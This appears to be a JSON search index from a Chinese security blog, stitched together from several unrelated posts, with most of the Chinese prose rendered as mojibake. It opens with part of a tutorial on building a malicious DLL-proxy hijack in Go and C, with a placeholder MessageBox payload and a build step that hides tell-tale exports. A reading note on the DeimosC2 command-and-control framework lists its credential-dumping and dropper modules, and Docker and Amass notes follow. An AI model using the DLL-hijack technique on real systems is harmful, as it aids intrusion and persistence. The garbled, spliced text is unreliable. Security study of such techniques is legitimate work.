switch (_fdwReason) { case DLL_PROCESS_ATTACH: // Initialize once for each new process. // Return FALSE to fail DLL load. { MyThreadParams* lpThrdParam = (MyThreadParams*)malloc(sizeof(MyThreadParams)); lpThrdParam-\u0026gt;hinstDLL = _hinstDLL; lpThrdParam-\u0026gt;fdwReason = _fdwReason; lpThrdParam-\u0026gt;lpReserved = _lpReserved; HANDLE hThread = CreateThread(NULL, 0, MyThreadFunction, lpThrdParam, 0, NULL); // CreateThread() because otherwise DllMain() is highly likely to deadlock. } break; case DLL_PROCESS_DETACH: // Perform any necessary cleanup. break; case DLL_THREAD_DETACH: // Do thread-specific cleanup. break; case DLL_THREAD_ATTACH: // Do thread-specific initialization. break; } return TRUE; // Successful. } æ³¨æ„æ­¤å¤„æœ€å¥½ä½¿ç”¨ CreateThread æ¥è¿›è¡Œå¤–éƒ¨ Go å‡½æ•°çš„è°ƒç”¨ï¼Œä¸ç„¶å¯èƒ½å› ä¸ºåˆå§‹åŒ– Go è¿è¡Œæ—¶çš„é—®é¢˜å¯¼è‡´æ­»é”ã€‚\næˆ‘ä»¬åœ¨è¯¥ä»£ç ä¸­ DLL_PROCESS_ATTACH æ—¶å¼‚æ­¥è°ƒç”¨äº† OnProcessAttachï¼Œæˆ‘ä»¬åœ¨ Golang ä¸­å®ç°è¿™ä¸ªæ¶æ„å‡½æ•°\nGolang æ¶æ„ä»£ç  æˆ‘ä»¬ç°åœ¨æ¥å®šä¹‰æˆ‘ä»¬çš„æ¶æ„ä»£ç å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main import \u0026#34;C\u0026#34; import ( \u0026#34;unsafe\u0026#34; \u0026#34;syscall\u0026#34; ) // MessageBox of Win32 API. func MessageBox(hwnd uintptr, caption, title string, flags uint) int { ret, _, _ := syscall.NewLazyDLL(\u0026#34;user32.dll\u0026#34;).NewProc(\u0026#34;MessageBoxW\u0026#34;).Call( uintptr(hwnd), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), uintptr(flags)) return int(ret) } // MessageBoxPlain of Win32 API. func MessageBoxPlain(title, caption string) int { const ( NULL = 0 MB_OK = 0 ) return MessageBox(NULL, caption, title, MB_OK) } // OnProcessAttach is an async callback (hook). //export OnProcessAttach func OnProcessAttach( hinstDLL unsafe.Pointer, // handle to DLL module fdwReason uint32, // reason for calling function lpReserved unsafe.Pointer, // reserved ) { MessageBoxPlain(\u0026#34;OnProcessAttach\u0026#34;, \u0026#34;OnProcessAttach\u0026#34;) } func main() { // Need a main function to make CGO compile package as C shared library } æ­¤å¤„æˆ‘ä»¬å®ç°äº†æ¶æ„å‡½æ•° OnProcessAttachï¼Œåªæ˜¯å¼¹ä¸ªçª—æ¥æ¨¡æ‹Ÿæ¶æ„ä»£ç ã€‚\nç»„åˆ Golang å’Œ c ç¼–è¯‘ ç°åœ¨æˆ‘ä»¬æœ‰äº† .go å’Œ .cï¼Œè¿˜éœ€è¦æŠŠå®ƒä»¬ä¸¤ä¸ªç²˜åˆèµ·æ¥\nç¬¬ä¸€ç§æ–¹æ¡ˆ ä½ å¯ä»¥é€šè¿‡ cgo çš„ä¸€èˆ¬å†™æ³•ï¼Œåœ¨ .go çš„æ³¨é‡Šä¸­æŠŠ c ä»£ç æ‹·è´è¿›å»ï¼Œä¾‹å¦‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package main /* #include \u0026#34;dllmain.h\u0026#34; typedef struct { HINSTANCE hinstDLL; // handle to DLL module DWORD fdwReason; // reason for calling function // reserved LPVOID lpReserved; // reserved } MyThreadParams; DWORD WINAPI MyThreadFunction(LPVOID lpParam) { MyThreadParams params = *((MyThreadParams*)lpParam); OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved); free(lpParam); return 0; } ...cæºç æ–‡ä»¶ */ import \u0026#34;C\u0026#34; import ( \u0026#34;unsafe\u0026#34; \u0026#34;syscall\u0026#34; ) // MessageBox of Win32 API. func MessageBox(hwnd uintptr, caption, title string, flags uint) int { ret, _, _ := syscall.NewLazyDLL(\u0026#34;user32.dll\u0026#34;).NewProc(\u0026#34;MessageBoxW\u0026#34;).Call( uintptr(hwnd), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), uintptr(flags)) return int(ret) } ...go æºç æ–‡ä»¶ ç¬¬äºŒç§æ–¹æ¡ˆ æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç»™ .c å†™ä¸€ä¸ªå¤´æ–‡ä»¶ .hï¼Œç„¶ååœ¨ .go ä¸­å¯¼å…¥è¿™ä¸ªå¤´æ–‡ä»¶ï¼Œåœ¨ go build çš„æ—¶å€™ Go ç¼–è¯‘å™¨ä¼šé»˜è®¤æ‰¾åˆ°è¯¥ç›®å½•ä¸‹çš„ .cã€.hã€.go ä¸€èµ·ç¼–è¯‘ã€‚\næ¯”å¦‚ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª .h æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 #include \u0026lt;windows.h\u0026gt; void OnProcessAttach(HINSTANCE, DWORD, LPVOID); BOOL WINAPI DllMain( HINSTANCE _hinstDLL, // handle to DLL module DWORD _fdwReason, // reason for calling function LPVOID _lpReserved // reserved ); ç„¶ååœ¨ .go ä¸­å¼•ç”¨å®ƒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main /* #include \u0026#34;dllmain.h\u0026#34; */ import \u0026#34;C\u0026#34; import ( \u0026#34;unsafe\u0026#34; \u0026#34;syscall\u0026#34; ) // MessageBox of Win32 API. func MessageBox(hwnd uintptr, caption, title string, flags uint) int { ret, _, _ := syscall.NewLazyDLL(\u0026#34;user32.dll\u0026#34;).NewProc(\u0026#34;MessageBoxW\u0026#34;).Call( uintptr(hwnd), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), uintptr(flags)) return int(ret) } ç„¶åå°±å¯ä»¥ä¸€èµ·ç¼–è¯‘äº†ã€‚\nå¯¼å‡ºè¡¨çš„é—®é¢˜ ç¡®å®ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ç¼–è¯‘å‡ºæ¶æ„çš„è½¬å‘dlläº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯èƒ½ä¼šå‘ç°å¯¼å‡ºè¡¨é‡Œé¢å…¶å®æœ‰å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å¯¼å‡ºå‡½æ•°\nè¿™äº›å¯¼å‡ºå‡½æ•°å¯èƒ½ä¼šæˆä¸ºæŸäº›ç‰¹å¾\næˆ‘ä»¬çš„åŸå§‹dllå¹¶æ²¡æœ‰è¿™äº›å¯¼å‡ºå‡½æ•°ï¼Œä½†æ˜¯ç”Ÿæˆçš„è½¬å‘dllè¿™ä¹ˆå¤šå¥‡æ€ªçš„å¯¼å‡ºå‡½æ•°è¯¥æ€ä¹ˆå»æ‰ï¼Ÿ\næˆ‘ä»¬å¯ä»¥åŒæ ·å¯ä»¥ä½¿ç”¨ä¸Šæ–‡çš„ exp æ–‡ä»¶æ¥è§£å†³ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå¯¼å‡ºåº“æ–‡ä»¶ï¼Œæ¥å®šä¹‰æœ‰å“ªäº›å¯¼å‡ºçš„ã€‚\næ ¹æ®ä¸Šæ–‡çš„æ–¹æ³•æˆ‘ä»¬ä½¿ç”¨ dlltool ä» def æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª exp æ–‡ä»¶ï¼Œç„¶åç¼–è¯‘æ—¶åŠ å…¥é“¾æ¥å³å¯ã€‚\n1 go build -buildmode=c-shared -o add.dll -ldflags=\u0026#34;-extldflags=-Wl,/home/lab/Repo/go-dll-proxy/dllmain/functions.exp -s -w\u0026#34; ldflags é‡Œé¢çš„æ–°å¢çš„ -s -w åªæ˜¯ä¸ºäº†å‡å°ä¸€ç‚¹ä½“ç§¯å»é™¤ä¸€ä¸‹ç¬¦å·ï¼Œå¯é€‰ã€‚\næœ€åçš„æœ€å ä»“åº“ç›¸å…³ç¤ºä¾‹å·²ç»ä¸Šä¼ è‡³ github.com/akkuman/go-dll-evil\næ„Ÿå…´è¶£çš„å¯ä»¥æŸ¥çœ‹ã€‚\nå‚è€ƒèµ„æ–™ [1] PEçŸ¥è¯†å¤ä¹ ä¹‹PEçš„å¯¼å‡ºè¡¨ [2] DLL Proxying [3] /EXPORT (Exports a Function) [4] Windows Privilege Escalation - DLL Proxying [5] DLL Hijacking using DLL Proxying technique [6] DLLä¹‹defå’Œexpæ–‡ä»¶ä½œç”¨ [7] mingwç¯å¢ƒä¸­ä½¿ç”¨dlltoolå·¥å…·æ¥ç”ŸæˆåŠ¨æ€åº“çš„æ­¥éª¤ [8] Specifying the DEF file when compiling a DLL with Clang [9] issues - cmd/link: support msvc object files [10] gcc Options for Linking [11] RUSTGO: CALLING RUST FROM GO WITH NEAR-ZERO OVERHEAD [12] Go Execution Modes [13] go tool link [14] DllMain entry point [15] DllMainç®€ä»‹å’ŒDLLç¼–å†™è¯´æ˜ [16] Call Go function from C function [17] github.com/NaniteFactory/dllmain [18] How to implement DllMain entry point in Go ","permalink":"https://www.hacktech.cn/post/golang-evil-dll-proxy.html","summary":"\u003cp\u003eæœ¬æ–‡ç« å°†è®²è§£å¦‚ä½•ä½¿ç”¨æ¶æ„çš„ Golang æ¥å®ç° dll åŠ«æŒè½¬å‘\u003c/p\u003e","title":"golangå®ç°dllæ¶æ„åŠ«æŒè½¬å‘"},{"content":"èŠ±äº†ç‚¹æ—¶é—´é˜…è¯»äº†ä¸€ä¸‹ https://github.com/DeimosC2/DeimosC2 é¡¹ç›®çš„æºä»£ç ï¼Œæœ¬æ–‡æ˜¯ä¸€ä¸ªç®€è¦çš„é˜…è¯»ç¬”è®°\né¡¹ç›®ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 . | build_frontend.bat | build_frontend.sh | requirements.txt | serial | +---agents | +---doh | | doh_agent.go DNSOverHTTP agentä»£ç  | +---https | | https_agent.go HTTPS agent | +---quic | | quic_agent.go QUIC agent | +---resources agentåŸºç¡€åŠŸèƒ½ | | +---agentfunctions | | | functions.go | | +---domainhiding | | | esni_DoH.go | | +---filebrowser | | | filebrowser_linux.go | | | filebrowser_mac.go | | | filebrowser_windows.go | | +---fingerprint | | | fingerprint_linux.go | | | fingerprint_mac.go | | | fingerprint_windows.go | | +---selfdestruction | | | kill_linux.go | | | kill_macos.go | | | kill_windows.go | | +---shellexec | | | exec_both.go | | | exec_windows.go | | \\---shellinject | | shellcode_linux.go | | shellcode_macos.go | | shellcode_windows.go | \\---tcp | tcp_agent.go +---archives +---c2 C2 serverä¸»ç¨‹åº | | main.go ç¨‹åºå…¥å£ | | requirements.txt | +---agents | | | agent_handler.go agentç›¸å…³åŸºç¡€æ–¹æ³• | | \\---techniques ä¸€äº›å…¶ä»–æŠ€æœ¯ç›¸å…³å®ç° | | \\---httpstechniques | | domainhiding.go | | normal.go | +---gobfuscate gobfuscateå¼€æºé¡¹ç›®æŠ½å–[golangæ··æ·†]ï¼Œå¯ä½¿ç”¨garble | | const_to_var.go | | gobfuscate.go | | gopath_copy.go | | hash.go | | LICENSE | | pkg_names.go | | README.md | | strings.go | | symbols.go | | util.go | +---lib | | | listener_handler.go ç›‘å¬å™¨ç›¸å…³åŸºç¡€æ–¹æ³• | | +---archive | | | archive.go æ•°æ®å¤‡ä»½ç›¸å…³ | | +---certs | | | gen_cert.go è¯ä¹¦ç”Ÿæˆ | | +---gobuild | | | compile.go å¯¹ç”Ÿæˆçš„goä»£ç è¿›è¡Œç¼–è¯‘ï¼Œç”Ÿæˆagentå®¢æˆ·ç«¯ | | +---sqldb | | | sql.go æœåŠ¡ç«¯æ•°æ®åº“ç›¸å…³ | | \\---validation | | validation.go æœåŠ¡ç«¯å‰åç«¯æ•°æ®éªŒè¯ | +---listeners æœåŠ¡ç«¯ç›‘å¬å™¨ç›¸å…³å®ç° | | common.go | | dns.go | | https.go | | quic.go | | tcp.go | +---loot æˆ˜åˆ©å“ç›¸å…³æ“ä½œ | | loot.go | +---modules æ¨¡å—åŠ è½½ç›¸å…³ | | module_handler.go | | reflectivedll.go | +---webserver æœåŠ¡ç«¯å‰åç«¯äº¤äº’ç›¸å…³ | | | dashboard.go | | | webserver.go | | +---googauth | | | googauth.go | | +---mfa | | | mfa.go | | \\---websockets | | alerts.go | \\---webshells | webshell_handler.go +---docs | CHANGELOG.md +---droppers | +---Linux | | +---Bash | | | ondisk_dropper_tcp.sh | | +---Perl | | | ondisk_dropper_tcp.pl | | \\---python | | ondisk_dropper_tcp.py | +---Templates | | tcp.template | \\---Windows | | dropper_options.json | +---binary | | \\---golang | | dropper.go | +---Perl | | ondisk_dropper_tcp.pl | +---PowerShell | | ondisk_dropper_tcp.ps1 | \\---python | ondisk_dropper_tcp.py +---lib | +---agentscommon | | agents.go | +---crypto | | aes.go | | rsa.go | +---logging | | log.go | +---modulescommon | | common.go | +---privileges | | isadmin_linux.go | | isadmin_macos.go | | isadmin_windows.go | \\---utils | utils.go +---modules ä¸€äº›çš„é¢å¤–æ¨¡å— | +---collection | | \\---screengrab | | +---agents | | | +---bin | | | \\---src | | | screengrab.c | | | screengrab.go | | \\---server | | +---bin | | \\---src | | screengrab.go | +---credentialaccess | | +---lsadump | | | +---agents | | | | +---bin | | | | \\---src | | | | lsadump.go | | | \\---server | | | +---bin | | | \\---src | | | lsadump.go | | +---minidump | | | +---agents | | | | +---bin | | | | \\---src | | | | minidump.c | | | | minidump.go | | | \\---server | | | +---bin | | | \\---src | | | lsassparse.py | | | minidump.go | | +---ntdsdump | | | +---agents | | | | +---bin | | | | \\---src | | | | ntdsdump.go | | | \\---server | | | +---bin | | | \\---src | | | ntdsdump.go | | +---samdump | | | +---agents | | | | +---bin | | | | \\---src | | | | samdump.go | | | \\---server | | | +---bin | | | \\---src | | | lsaparse.py | | | samdump.go | | | samparse.py | | \\---shadowdump | | +---agents | | | +---bin | | | \\---src | | | shadowdump.go | | \\---server | | +---bin | | \\---src | | shadowdump.go | +---discovery | | empty.txt | +---dlls | | c2.c | +---exfil | | empty.txt | +---lateral_movement | | empty.txt | +---persistence | | empty.txt | \\---privilege_escalation | empty.txt ç¨‹åºä¸»ä½“ åˆå§‹åŒ–æ—¥å¿— è‡ªå®šä¹‰ GOROOT å’Œ GOPATH ç¯å¢ƒå˜é‡ æ¢å¤ï¼ˆç›‘å¬å™¨å’Œwebshellï¼‰æˆ–åˆå§‹åŒ–æ•°æ®åº“ï¼Œè‡ªå®šä¹‰æˆ–ç”Ÿäº§è¯ä¹¦ é¢„æ··æ·†ï¼ˆä¾èµ–æ–‡ä»¶æ‹·è´åˆ°GOPATHï¼‰ å¯åŠ¨æ’ä»¶æ³¨å†ŒRPCæœåŠ¡ æ‰§è¡Œå®šæœŸå¤‡ä»½ å¯åŠ¨å‰åç«¯ä¹‹é—´çš„httpså’Œwebsocketæ¥å£æœåŠ¡ ç»†èŠ‚ æœåŠ¡ç«¯é’ˆå¯¹æ¯ä¸€ä¸ªsessionç»´æŠ¤äº†ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤é˜Ÿåˆ—ï¼Œagentç«¯é’ˆå¯¹æ‰€æœ‰ä»»åŠ¡çš„è¾“å‡ºç»“æœç»´æŠ¤äº†ä¸€ä¸ªé˜Ÿåˆ—\nserverå’Œagentä¹‹é—´ç»´æŠ¤ç€å¿ƒè·³ï¼Œç”±agentä¸»åŠ¨å‘serverå‘é€å¿ƒè·³ï¼Œæ¯æ¬¡å¿ƒè·³æ—¶ï¼Œagentä»serverå¯¹åº”çš„ä»»åŠ¡é˜Ÿåˆ—ä¸­è·å–å‘½ä»¤æ‹¿å»æ‰§è¡Œï¼ŒåŒæ—¶å°†è‡ªå·±çš„å‘½ä»¤ç»“æœè¾“å‡ºè¿”å›åˆ°server\néœ€è¦è¯´ä¸€ä¸‹çš„æ˜¯modulesæ–‡ä»¶å¤¹ï¼Œé‡Œé¢åˆ†ä¸ºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ˜¯æŠ•é€’åˆ°agentä¸­æ‰§è¡Œçš„ï¼ŒæœåŠ¡ç«¯çš„æ¦‚å¿µæ˜¯c2æœåŠ¡å™¨ä¸­æ³¨å†Œçš„æ’ä»¶ï¼Œæ•´ä¸ªæµç¨‹å¤§è‡´ä¸Šä¸ºï¼š\nç”¨æˆ·ä¸‹å‘æ¨¡å—ä»»åŠ¡ æ‰¾åˆ°å¯¹åº”çš„æ¨¡å— å¯åŠ¨è¯¥æ¨¡å—æ’ä»¶RPCæœåŠ¡å¹¶åœ¨c2 RPCæœåŠ¡ä¸­æ³¨å†Œæ’ä»¶ å°†æ¨¡å—å®¢æˆ·ç«¯æŠ•é€’åˆ°agentè¿›è¡Œæ‰§è¡Œ c2æœåŠ¡å™¨è·å–åˆ°ä»»åŠ¡ç»“æœ å°†ä»»åŠ¡ç»“æœå‘é€è‡³æ¨¡å—æ’ä»¶RPCæœåŠ¡è¿›è¡Œå¤„ç†å¹¶è¿”å›å¤„ç†ç»“æœ å…¶ä¸­agentç«¯çš„æ¶æ„ä¹Ÿéœ€è¦è¯´ä¸€ä¸‹ï¼Œagentæ”¯æŒä¸¤ç§æ¨¡å—å½¢å¼ï¼š\ndrop: ç›´æ¥æŠ•é€’äºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åºæ¯”å¦‚exeåˆ°agentè¿›è¡Œæ‰§è¡Œ inject: æŠ•é€’åå°„dllè‡³agentçš„å†…å­˜ä¸­æ‰§è¡Œ å…¶ä¸­dropå½¢å¼çš„å°±æ˜¯ä¸Šæ–‡ä¸­æåˆ°çš„æ¨¡å—æ’ä»¶ï¼Œc2åˆ©ç”¨rpcè¿›è¡Œä¸ç¬¬ä¸‰æ–¹æ¨¡å—ä¹‹é—´çš„é€šä¿¡ï¼Œç¬¬ä¸‰æ–¹æ¨¡å—é€šè¿‡c2çš„rpcæ³¨å†Œè‡ªå·±çš„æ’ä»¶ï¼Œc2é€šè¿‡æ’ä»¶çš„rpcå°†ç»“æœå‘é€è‡³æ’ä»¶è¿›è¡Œå¤„ç†ï¼Œåœ¨agentä¹Ÿæœ‰ç±»ä¼¼çš„å¤„ç†ï¼Œé¦–å…ˆagentä¼šå¯åŠ¨ä¸€ä¸ªrpcæœåŠ¡ï¼Œç„¶åæ¥æ”¶åˆ°c2æŠ•é€’è¿‡æ¥çš„drop exeåï¼Œå°†rpcç«¯å£ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™è¯¥exeè¿›è¡Œæ‰§è¡Œï¼Œç„¶ådrop exeæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå°†ç»“æœé€šè¿‡ä¼ é€’è¿›æ¥çš„rpcæœåŠ¡ç«¯å£è¿›è¡Œç»“æœå›é€\n","permalink":"https://www.hacktech.cn/post/deimosc2-source-read.html","summary":"\u003cp\u003eèŠ±äº†ç‚¹æ—¶é—´é˜…è¯»äº†ä¸€ä¸‹ \u003ca href=\"https://github.com/DeimosC2/DeimosC2\"\u003ehttps://github.com/DeimosC2/DeimosC2\u003c/a\u003e é¡¹ç›®çš„æºä»£ç ï¼Œæœ¬æ–‡æ˜¯ä¸€ä¸ªç®€è¦çš„é˜…è¯»ç¬”è®°\u003c/p\u003e","title":"DeimosC2 æºç é˜…è¯»"},{"content":"æœ‰äº›æ—¶å€™æˆ‘ä»¬ docker build é•œåƒä¼šå‡ºç°å¾ˆå¤š \u0026lt;none\u0026gt; çš„æ®‹ä½™ cache image åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­ã€‚\nå¯ä»¥ä½¿ç”¨ awk æ¥å®Œæˆä¸€è¡Œå‘½ä»¤åˆ é™¤ç©ºçš„docker images\n1 sudo docker images | awk \u0026#39;{if($1==\u0026#34;\u0026lt;none\u0026gt;\u0026#34;) print $3}\u0026#39; | xargs sudo docker rmi ","permalink":"https://www.hacktech.cn/post/one-line-docker-emi-none.html","summary":"\u003cp\u003eæœ‰äº›æ—¶å€™æˆ‘ä»¬ docker build é•œåƒä¼šå‡ºç°å¾ˆå¤š \u003ccode\u003e\u0026lt;none\u0026gt;\u003c/code\u003e çš„æ®‹ä½™ cache image åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­ã€‚\u003c/p\u003e","title":"ä¸€è¡Œå‘½ä»¤åˆ é™¤ç©ºçš„docker images"},{"content":"å½“æˆ‘ä»¬åŸºäºubuntué•œåƒæ„å»ºDockerçš„æ—¶å€™ï¼Œå¶å°”ä¼šå‡ºç° please select the geographic area in which you live. è®©æˆ‘ä»¬é€‰æ‹©æ—¶åŒº\nåŸå› æ˜¯ubuntu 18.04åæ²¡æœ‰é»˜è®¤çš„ç³»ç»Ÿæ—¶åŒºï¼Œå®‰è£…tzdataä¼šå‡ºç°äº¤äº’å¼æ—¶åŒºè®¾ç½®\nè§£å†³æ–¹æ¡ˆ Dockerfile å¼€å¤´åŠ ä¸Š\n1 2 ARG DEBIAN_FRONTEND=noninteractive ENV TZ=Asia/Shanghai ","permalink":"https://www.hacktech.cn/post/docker-build-ubuntu-interactive-tzdata.html","summary":"\u003cp\u003eå½“æˆ‘ä»¬åŸºäºubuntué•œåƒæ„å»ºDockerçš„æ—¶å€™ï¼Œå¶å°”ä¼šå‡ºç° \u003ccode\u003eplease select the geographic area in which you live.\u003c/code\u003e è®©æˆ‘ä»¬é€‰æ‹©æ—¶åŒº\u003c/p\u003e","title":"docker buildå‡ºç°äº¤äº’å¼æ—¶åŒºè®¾ç½®è§£å†³"},{"content":"æœ¬æ–‡å†™äº Amass v3.11.2ï¼Œå¯èƒ½åç»­æœ‰è¿‡æ›´å¤šå˜æ›´ï¼Œä½†æ˜¯åº”è¯¥æ•´ä½“é€»è¾‘ä¸ä¼šæœ‰ååˆ†å¤§çš„å˜åŠ¨äº†\nå‘å±• é¦–å…ˆé“ºå«ä¸‹åœ¨ Amass ç”¨åˆ°çš„ä¸¤å¤§è®¾è®¡æ¨¡å¼ï¼š\nå‘å¸ƒè®¢é˜…æ¨¡å¼ æµæ°´çº¿(pipeline)æ¨¡å¼ åœ¨ 4432dbd è¯¥æäº¤ä¹‹å‰ï¼Œå³ v3.11.0 ç‰ˆæœ¬å‰ï¼Œå…¶å®å¹¶æ²¡æœ‰æµæ°´çº¿æ¨¡å¼ï¼Œå¹¶ä¸”é‡‡ç”¨çš„æ˜¯ Golang æ¥å†™æ’ä»¶ï¼Œåœ¨æ­¤ä¹‹åï¼Œé¡¹ç›®è´Ÿè´£äºº Jeff Foley å¯¹è¯¥é¡¹ç›®è¿›è¡Œäº†ä¸€æ¬¡å¤§çš„é‡æ„ï¼ŒæŠŠä»–è‡ªå·±å†™çš„ eventbus å’Œ service å…¨éƒ¨æŠ½ç¦»äº†å‡ºæ¥æˆä¸ºäº†ç‹¬ç«‹çš„åº“ï¼Œå¹¶ä¸”å¼•å…¥äº†ä»–è‡ªå·±å®ç°çš„ pipeline åº“æ¥å®ç°æ•´ä¸ªå­åŸŸåæ”¶é›†çš„æµæ°´çº¿ä½œä¸šã€‚åŒæ—¶ï¼ŒåŸæœ¬é‡‡ç”¨ Golang ç¼–å†™çš„æ•°æ®æºæ’ä»¶ï¼Œé€šè¿‡å¼•å…¥ç¬¬ä¸‰æ–¹åº“ gopher-lua èµ‹äºˆäº†è„šæœ¬ç¼–å†™æ’ä»¶çš„èƒ½åŠ›ï¼Œå®ç°äº†æ’ä»¶ç³»ç»Ÿä¸ä¸»ç¨‹åºçš„å‰¥ç¦»ã€‚\næ”¹ç‰ˆå‰ æˆ‘è¿™é‡ŒæŠŠé¡¹ç›®åŒºåˆ†ä¸º v3.11.0 å‰å’Œå\nåœ¨ v3.11.0 ä¹‹å‰ï¼Œæ•´ä¸ªé¡¹ç›®è¿è¡Œï¼Œä»å…¥å£å‡½æ•°è¿›å…¥åï¼Œç»è¿‡ç®€å•å¤„ç†åï¼Œå¼€å§‹ç»è¿‡æ‰€æœ‰çš„æ•°æ®æºæœåŠ¡æ’ä»¶ï¼Œå…¶ä¸­æ‰€æœ‰çš„æ•°æ®æºæœåŠ¡æ’ä»¶éƒ½éœ€è¦å®ç° services.Service æ¥å£ï¼Œé€šè¿‡è¦†å†™ç»“æ„ä½“æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ã€‚\nç»è¿‡æ‰€æœ‰çš„æ•°æ®æºæœåŠ¡æ’ä»¶å‰ï¼Œæœ‰ä¸€ä¸ªæ­¥éª¤æ˜¯æ³¨å†Œæ‰€æœ‰çš„æ¶ˆæ¯è®¢é˜…è€…ï¼Œç„¶åæ•°æ®æºæœåŠ¡æ’ä»¶å‘ç°æ–°çš„å­åŸŸåï¼Œå‘å¸ƒæ¶ˆæ¯åˆ°äº‹ä»¶æ€»çº¿ï¼ˆæˆ–è€…è¯´æ¶ˆæ¯é˜Ÿåˆ—ï¼‰ä¸­ï¼Œç„¶åæ¶ˆæ¯è®¢é˜…è€…è·å–åˆ°æ•°æ®åè¿›è¡Œåç»­å¤„ç†ï¼Œæ¯”å¦‚è¾“å‡ºæ—¥å¿—ï¼Œå…¥åº“ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ³›è§£æï¼Œipè§£æç­‰ç­‰\nå…¶ä¸­çš„å‘å¸ƒè®¢é˜…æ¨¡å¼æ˜¯ä¸€ä¸ªç®€æ˜“çš„æ¶ˆæ¯é˜Ÿåˆ—å®ç°ï¼Œè¿™é‡Œé¢æœ‰å‡ ä¸ªæ¦‚å¿µï¼š\næ¶ˆæ¯å‘å¸ƒ æ¶ˆæ¯è®¢é˜…å¤„ç† æ¶ˆæ¯é¢‘é“ï¼ˆè·¯ç”±/topicï¼‰ é¦–å…ˆéœ€è¦æŠŠæ¶ˆæ¯è®¢é˜…è€…ï¼ˆå¤„ç†å‡½æ•°ï¼‰æ³¨å†Œåˆ°ç³»ç»Ÿä¸­ï¼Œé‡‡ç”¨çš„æ˜¯ hash è¡¨ï¼Œå³ golang ä¸­çš„ mapï¼Œä¸åŒçš„topicå®šä¹‰ä¸ºä¸åŒçš„é”®ï¼Œå¤„ç†å‡½æ•°è®¾ç½®ä¸ºå€¼ï¼Œç„¶åå‘å¸ƒè€…å‘å¸ƒæ¶ˆæ¯åˆ°å¯¹åº”çš„è·¯ç”±ï¼Œå°è£…å¥½å¯¹åº”çš„è·¯ç”±å’Œæ•°æ®åå¡è¿›é˜Ÿåˆ—ï¼Œå¦å¤–æœ‰åç¨‹ä¸€ç›´åœ¨ä»é˜Ÿåˆ—ä¸­å–å‡ºå…ƒç´ ï¼Œæ ¹æ®æ‰€å¾—åˆ°çš„è·¯ç”±å’Œæ•°æ®å‚æ•°è°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°ã€‚\næ€»ä½“æ˜¯ä¸€ä¸ªæ ‘çŠ¶å‘æ•£çš„ï¼Œå³æœ‰å¯èƒ½å¤„ç†çš„æ•°æ®ä¼šç»§ç»­å‘å¸ƒåˆ°æ€»çº¿ç»™å…¶ä»–çš„å¤„ç†å‡½æ•°å¤„ç†ã€‚\nè¿™æ ·ä¼šå¯¼è‡´ä¸¤ä¸ªé—®é¢˜ï¼š\nå› ä¸ºå‘å¸ƒæ¶ˆæ¯çš„ç»“æŸæ ‡è¯†æ— æ³•è·çŸ¥ï¼Œè®¢é˜…æ¶ˆæ¯çš„ç»“æŸæ ‡è¯†ä¹Ÿæ˜¯æ— æ³•è·çŸ¥ï¼Œæ•´ä½“çš„æ ‘çŠ¶å‘æ•£æ›´å¯¼è‡´å®šä¹‰ä»»åŠ¡ç»“æŸæ„ˆå‘å›°éš¾ å°±åƒä¸Šé¢è¯´çš„ï¼Œæœ‰äº›å¤„ç†å‡½æ•°æ˜¯æœ‰ä¸€ä¸ªå¤„ç†æµç¨‹çš„ï¼Œæ¯”å¦‚å…ˆç»™è°å¤„ç†ï¼Œå†ç»™å¤„ç†ï¼Œå…¨éƒ¨ç§»äº¤åˆ°æ¶ˆæ¯æ€»çº¿ï¼Œå†ç”±å„è‡ªçš„è®¢é˜…å¤„ç†ï¼Œå¯¼è‡´æ•´ä½“çš„æ•°æ®æµåŠ¨æä¸ºæ™¦æ¶©ï¼Œå¦‚æœä¸é€šè¯»æ‰€æœ‰å¤„ç†å‡½æ•°çš„æºç å¾ˆéš¾æ¢³ç†æ˜ç™½å¤„ç†å‡½æ•°ä¹‹é—´çš„å…ˆåå…³ç³» 